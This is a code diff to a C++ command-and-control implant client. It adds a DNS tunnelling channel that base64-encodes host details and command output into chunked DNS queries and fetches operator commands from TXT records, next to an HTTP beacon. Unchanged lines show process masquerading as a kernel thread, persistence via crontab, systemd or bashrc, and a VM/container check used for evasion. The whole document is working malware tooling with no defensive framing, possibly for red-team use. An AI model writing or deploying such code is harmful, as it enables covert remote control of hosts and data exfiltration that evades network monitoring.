@@ -17,6 +17,7 @@
 #include <cstring>
 #include <fstream>
 #include <iostream>
+#include <memory>
 #include <random>
 #include <sstream>
 #include <string>
@@ -50,6 +51,17 @@
 #ifndef C2_DEFAULT_JITTER
 #define C2_DEFAULT_JITTER 0.3
 #endif
+#ifndef C2_DEFAULT_CHANNEL
+#define C2_DEFAULT_CHANNEL "http"
+#endif
+#ifndef C2_DEFAULT_DNS_DOMAIN
+#define C2_DEFAULT_DNS_DOMAIN "c2.local"
+#endif
+#ifndef C2_DEFAULT_DNS_PORT
+#define C2_DEFAULT_DNS_PORT 15353
+#endif
+
+static const int DNS_CHUNK_SIZE = 50;
 
 // ── Helpers ──────────────────────────────────────────────────────────
 
@@ -156,6 +168,146 @@ static std::vector<CmdEntry> parse_commands(const std::string &json)
         pos = end + 1;
     }
     return out;
+}
+
+// ── Base64 ──────────────────────────────────────────────────────────
+
+static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+static const char b64url_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+
+static std::string base64_encode(const std::string &in, bool urlsafe = false)
+{
+    const char *tbl = urlsafe ? b64url_table : b64_table;
+    std::string out;
+    int val = 0, valb = -6;
+    for (unsigned char c : in) {
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            out.push_back(tbl[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6) out.push_back(tbl[((val << 8) >> (valb + 8)) & 0x3F]);
+    // No padding for urlsafe
+    if (!urlsafe)
+        while (out.size() % 4) out.push_back('=');
+    return out;
+}
+
+static std::string base64_decode(const std::string &in)
+{
+    // Build decode table supporting both standard and urlsafe
+    int T[256];
+    std::memset(T, -1, sizeof(T));
+    for (int i = 0; i < 64; ++i) { T[(int)b64_table[i]] = i; T[(int)b64url_table[i]] = i; }
+
+    std::string out;
+    int val = 0, valb = -8;
+    for (unsigned char c : in) {
+        if (T[c] == -1) continue;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) { out.push_back(char((val >> valb) & 0xFF)); valb -= 8; }
+    }
+    return out;
+}
+
+// ── DNS helpers ─────────────────────────────────────────────────────
+
+static std::vector<uint8_t> dns_build_query(const std::string &qname, uint16_t qtype = 16)
+{
+    std::vector<uint8_t> pkt;
+    // Transaction ID (random)
+    uint16_t txn = (uint16_t)(rand() & 0xFFFF);
+    pkt.push_back(txn >> 8); pkt.push_back(txn & 0xFF);
+    // Flags: standard query, RD=1
+    pkt.push_back(0x01); pkt.push_back(0x00);
+    // QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
+    pkt.push_back(0x00); pkt.push_back(0x01);
+    pkt.push_back(0x00); pkt.push_back(0x00);
+    pkt.push_back(0x00); pkt.push_back(0x00);
+    pkt.push_back(0x00); pkt.push_back(0x00);
+    // QNAME
+    std::istringstream iss(qname);
+    std::string label;
+    while (std::getline(iss, label, '.')) {
+        pkt.push_back((uint8_t)label.size());
+        for (char c : label) pkt.push_back((uint8_t)c);
+    }
+    pkt.push_back(0x00);
+    // QTYPE, QCLASS IN
+    pkt.push_back(qtype >> 8); pkt.push_back(qtype & 0xFF);
+    pkt.push_back(0x00); pkt.push_back(0x01);
+    return pkt;
+}
+
+static std::vector<std::string> dns_parse_txt(const uint8_t *data, size_t len)
+{
+    std::vector<std::string> results;
+    if (len < 12) return results;
+    uint16_t qdcount = (data[4] << 8) | data[5];
+    uint16_t ancount = (data[6] << 8) | data[7];
+
+    // Skip header + question section
+    size_t off = 12;
+    for (uint16_t q = 0; q < qdcount; ++q) {
+        while (off < len) {
+            uint8_t l = data[off];
+            if (l == 0) { off++; break; }
+            if (l >= 0xC0) { off += 2; break; }
+            off += 1 + l;
+        }
+        off += 4; // QTYPE + QCLASS
+    }
+
+    // Parse answer RRs
+    for (uint16_t a = 0; a < ancount; ++a) {
+        if (off >= len) break;
+        // Skip NAME
+        if (data[off] >= 0xC0) off += 2;
+        else { while (off < len && data[off] != 0) off += 1 + data[off]; off++; }
+
+        if (off + 10 > len) break;
+        uint16_t rtype = (data[off] << 8) | data[off+1];
+        uint16_t rdlength = (data[off+8] << 8) | data[off+9];
+        off += 10;
+
+        if (rtype == 16) { // TXT
+            size_t end = off + rdlength;
+            size_t pos = off;
+            while (pos < end && pos < len) {
+                uint8_t slen = data[pos++];
+                if (pos + slen > len) break;
+                results.emplace_back((const char*)&data[pos], slen);
+                pos += slen;
+            }
+        }
+        off += rdlength;
+    }
+    return results;
+}
+
+static std::vector<std::string> dns_query(const std::string &qname, const std::string &server_ip, int port, int retries = 3)
+{
+    auto pkt = dns_build_query(qname);
+    for (int attempt = 0; attempt < retries; ++attempt) {
+        int sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock < 0) continue;
+        struct timeval tv = {10, 0};
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        struct sockaddr_in srv{};
+        srv.sin_family = AF_INET;
+        srv.sin_port = htons(port);
+        inet_pton(AF_INET, server_ip.c_str(), &srv.sin_addr);
+        sendto(sock, pkt.data(), pkt.size(), 0, (struct sockaddr*)&srv, sizeof(srv));
+        uint8_t buf[4096];
+        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, nullptr, nullptr);
+        close(sock);
+        if (n > 0) return dns_parse_txt(buf, (size_t)n);
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+    }
+    return {};
 }
 
 // ── HTTP client (libcurl) ────────────────────────────────────────────
@@ -437,47 +589,26 @@ void masquerade(const char *name = "[kworker/0:2-events]")
     prctl(PR_SET_NAME, name, 0, 0, 0);
 }
 
-// ── Agent ────────────────────────────────────────────────────────────
+// ── Agent (abstract) ────────────────────────────────────────────────
 
 class Agent {
-    std::string base_url_;
+protected:
     int         interval_ms_;
     double      jitter_;
     std::mt19937 rng_{std::random_device{}()};
 
 public:
-    Agent(const std::string &server, int interval_sec, double jitter)
-        : base_url_("http://" + server + "/api/v1/agent")
-        , interval_ms_(interval_sec * 1000)
-        , jitter_(jitter) {}
-
-    std::string do_register()
-    {
-        std::string body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
-            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
-            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
-            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
-            + "\",\"communication_channel\":\"http\"}";
-        auto resp = Http::post(base_url_ + "/register", body);
-        return json_get(resp, "target_id");
-    }
-
-    std::vector<CmdEntry> beacon(const std::string &target_id)
-    {
-        auto resp = Http::get(base_url_ + "/" + target_id + "/commands");
-        if (resp.empty()) return {};
-        return parse_commands(resp);
-    }
-
-    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output)
-    {
-        std::string body = "{\"output\":\"" + json_escape(output) + "\"}";
-        Http::post(base_url_ + "/" + target_id + "/commands/" + cmd_id + "/result", body);
-    }
+    Agent(int interval_sec, double jitter)
+        : interval_ms_(interval_sec * 1000), jitter_(jitter) {}
+    virtual ~Agent() = default;
+    virtual std::string description() const = 0;
+    virtual std::string do_register() = 0;
+    virtual std::vector<CmdEntry> beacon(const std::string &target_id) = 0;
+    virtual void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) = 0;
 
     [[noreturn]] void run()
     {
-        std::cout << "[*] C2 Client (C++) — connecting to " << base_url_ << std::endl;
+        std::cout << "[*] C2 Client (C++) — " << description() << std::endl;
 
         // Registration loop
         std::string target_id;
@@ -514,6 +645,134 @@ public:
     }
 };
 
+// ── HTTP Agent ──────────────────────────────────────────────────────
+
+class HttpAgent : public Agent {
+    std::string base_url_;
+
+public:
+    HttpAgent(const std::string &server, int interval_sec, double jitter)
+        : Agent(interval_sec, jitter)
+        , base_url_("http://" + server + "/api/v1/agent") {}
+
+    std::string description() const override { return "HTTP channel → " + base_url_; }
+
+    std::string do_register() override
+    {
+        std::string body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
+            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
+            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
+            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
+            + "\",\"communication_channel\":\"http\"}";
+        auto resp = Http::post(base_url_ + "/register", body);
+        return json_get(resp, "target_id");
+    }
+
+    std::vector<CmdEntry> beacon(const std::string &target_id) override
+    {
+        auto resp = Http::get(base_url_ + "/" + target_id + "/commands");
+        if (resp.empty()) return {};
+        return parse_commands(resp);
+    }
+
+    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) override
+    {
+        std::string body = "{\"output\":\"" + json_escape(output) + "\"}";
+        Http::post(base_url_ + "/" + target_id + "/commands/" + cmd_id + "/result", body);
+    }
+};
+
+// ── DNS Agent ───────────────────────────────────────────────────────
+
+class DnsAgent : public Agent {
+    std::string server_ip_;
+    int         port_;
+    std::string domain_;
+
+public:
+    DnsAgent(const std::string &server_ip, int port, const std::string &domain,
+             int interval_sec, double jitter)
+        : Agent(interval_sec, jitter)
+        , server_ip_(server_ip), port_(port), domain_(domain) {}
+
+    std::string description() const override
+    {
+        return "DNS channel → " + server_ip_ + ":" + std::to_string(port_) + " domain=" + domain_;
+    }
+
+    std::string do_register() override
+    {
+        std::string json_body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
+            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
+            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
+            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
+            + "\",\"communication_channel\":\"dns\"}";
+        std::string b64 = base64_encode(json_body, true);
+
+        // Split into chunks
+        std::vector<std::string> chunks;
+        for (size_t i = 0; i < b64.size(); i += DNS_CHUNK_SIZE)
+            chunks.push_back(b64.substr(i, DNS_CHUNK_SIZE));
+        if (chunks.empty()) chunks.push_back("");
+        int total = (int)chunks.size();
+
+        // Send all chunks except last (ACK only)
+        for (int i = 0; i < total - 1; ++i) {
+            std::string qname = chunks[i] + "." + std::to_string(i) + "." + std::to_string(total) + ".reg." + domain_;
+            dns_query(qname, server_ip_, port_);
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        }
+
+        // Send last chunk — response contains target_id
+        int last = total - 1;
+        std::string qname = chunks[last] + "." + std::to_string(last) + "." + std::to_string(total) + ".reg." + domain_;
+        auto txts = dns_query(qname, server_ip_, port_);
+        if (txts.empty()) return "";
+
+        std::string b64_resp;
+        for (auto &t : txts) b64_resp += t;
+        try {
+            auto decoded = base64_decode(b64_resp);
+            return json_get(decoded, "target_id");
+        } catch (...) { return ""; }
+    }
+
+    std::vector<CmdEntry> beacon(const std::string &target_id) override
+    {
+        std::string qname = target_id + ".poll." + domain_;
+        auto txts = dns_query(qname, server_ip_, port_);
+        if (txts.empty()) return {};
+
+        std::string b64_data;
+        for (auto &t : txts) b64_data += t;
+        std::string payload;
+        try { payload = base64_decode(b64_data); }
+        catch (...) { return {}; }
+
+        auto id = json_get(payload, "id");
+        if (id.empty()) return {};
+        auto cmd = json_get(payload, "command");
+        return {{id, cmd}};
+    }
+
+    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) override
+    {
+        (void)target_id;
+        std::string b64 = base64_encode(output, true);
+        std::vector<std::string> chunks;
+        for (size_t i = 0; i < b64.size(); i += DNS_CHUNK_SIZE)
+            chunks.push_back(b64.substr(i, DNS_CHUNK_SIZE));
+        if (chunks.empty()) chunks.push_back("");
+        int total = (int)chunks.size();
+
+        for (int i = 0; i < total; ++i) {
+            std::string qname = chunks[i] + "." + std::to_string(i) + "." + std::to_string(total) + "." + cmd_id + ".res." + domain_;
+            dns_query(qname, server_ip_, port_);
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        }
+    }
+};
+
 // ── Main ─────────────────────────────────────────────────────────────
 
 static void print_usage()
@@ -524,6 +783,9 @@ Options:
   -s, --server <host:port>   C2 server (default: 127.0.0.1:8000)
   -i, --interval <sec>       Beacon interval (default: 10)
   -j, --jitter <0-1>         Jitter factor (default: 0.3)
+  -c, --channel <http|dns>   Communication channel (default: http)
+  --dns-domain <domain>       DNS C2 domain (default: c2.local)
+  --dns-port <port>           DNS server port (default: 15353)
   --persist <method>          none | crontab | systemd | bashrc
   --masquerade                Rename process to kernel thread name
   --container-check           Exit if container/VM detected
@@ -544,6 +806,9 @@ int main(int argc, char *argv[])
     std::string server   = env_server ? env_server : C2_DEFAULT_SERVER;
     int         interval = C2_DEFAULT_INTERVAL;
     double      jitter   = C2_DEFAULT_JITTER;
+    std::string channel  = C2_DEFAULT_CHANNEL;
+    std::string dns_domain = C2_DEFAULT_DNS_DOMAIN;
+    int         dns_port = C2_DEFAULT_DNS_PORT;
     std::string persist  = "none";
     bool        do_masq  = false;
     bool        cont_chk = false;
@@ -554,6 +819,9 @@ int main(int argc, char *argv[])
         if ((arg == "-s" || arg == "--server")   && i+1 < argc) server   = argv[++i];
         else if ((arg == "-i" || arg == "--interval") && i+1 < argc) interval = std::atoi(argv[++i]);
         else if ((arg == "-j" || arg == "--jitter")   && i+1 < argc) jitter   = std::atof(argv[++i]);
+        else if ((arg == "-c" || arg == "--channel")  && i+1 < argc) channel  = argv[++i];
+        else if (arg == "--dns-domain" && i+1 < argc) dns_domain = argv[++i];
+        else if (arg == "--dns-port"   && i+1 < argc) dns_port = std::atoi(argv[++i]);
         else if (arg == "--persist"    && i+1 < argc) persist  = argv[++i];
         else if (arg == "--masquerade") do_masq   = true;
         else if (arg == "--container-check") cont_chk  = true;
@@ -587,8 +855,17 @@ int main(int argc, char *argv[])
     else if (persist == "bashrc")   { Persist::bashrc(self_path);        std::cout << "[+] Persistence: bashrc" << std::endl; }
 
     // Run
-    Agent agent(server, interval, jitter);
-    agent.run();
+    std::unique_ptr<Agent> agent;
+    if (channel == "dns") {
+        // Extract IP from server (strip port if present)
+        std::string ip = server;
+        auto colon = ip.find(':');
+        if (colon != std::string::npos) ip = ip.substr(0, colon);
+        agent = std::make_unique<DnsAgent>(ip, dns_port, dns_domain, interval, jitter);
+    } else {
+        agent = std::make_unique<HttpAgent>(server, interval, jitter);
+    }
+    agent->run();
 
     curl_global_cleanup();
     return 0;
